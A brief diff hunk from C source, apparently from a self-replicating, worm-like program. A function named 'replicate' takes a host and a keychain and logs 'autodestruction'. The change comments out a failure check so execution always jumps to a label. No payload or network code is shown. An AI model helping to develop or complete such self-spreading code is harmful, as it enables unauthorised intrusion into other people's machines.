@@ -11,7 +11,7 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	EXIT_LOGGER("autodestruction:\t");
 #endif
 
-	if (context == FAILURE)
+//	if (context == FAILURE)
 		goto label;
 
 	pid_t child;
